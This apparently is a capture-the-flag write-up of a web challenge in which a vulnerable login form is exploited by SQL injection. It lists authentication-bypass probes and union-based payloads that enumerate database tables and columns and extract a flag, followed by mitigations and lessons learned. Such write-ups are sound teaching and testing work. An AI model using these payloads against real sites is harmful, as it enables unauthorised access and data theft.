---
layout: writeup
title: "Web Exploitation - SQL Injection"
competition: "CSAW CTF 2024"
category: "Web"
date: 2024-08-20
tags: [web, sql-injection, database]
excerpt: "Exploiting a SQL injection vulnerability to extract sensitive data from the database."
---

## Challenge Description

A web application with a vulnerable login form that's susceptible to SQL injection attacks.

**Challenge URL:** `http://challenge.ctf:5000`

## Initial Reconnaissance

The application presents a simple login form:

```html
<form action="/login" method="POST">
  <input name="username" placeholder="Username">
  <input name="password" type="password" placeholder="Password">
  <button>Login</button>
</form>
```

## Vulnerability Discovery

Testing basic SQL injection payloads in the username field:

```sql
' OR '1'='1
admin' --
' UNION SELECT NULL--
```

The application is vulnerable! Error messages reveal it's using MySQL.

## Exploitation

### Step 1: Enumerate Database Structure

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
```

Found tables: `users`, `flags`, `sessions`

### Step 2: Extract Column Names

```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='flags'--
```

Columns: `id`, `flag_value`

### Step 3: Retrieve the Flag

```sql
' UNION SELECT flag_value FROM flags--
```

## Flag

```
CTF{sql_1nj3ct10n_1s_st1ll_d4ng3r0us}
```

## Mitigation

This vulnerability could have been prevented by:
- Using parameterized queries (prepared statements)
- Input validation and sanitization
- Principle of least privilege for database users
- Web Application Firewall (WAF)

## Lessons Learned

- Always test user inputs for injection vulnerabilities
- Error messages can leak valuable information
- SQL injection remains a critical vulnerability despite being well-known
- Union-based injection is powerful when error messages are verbose

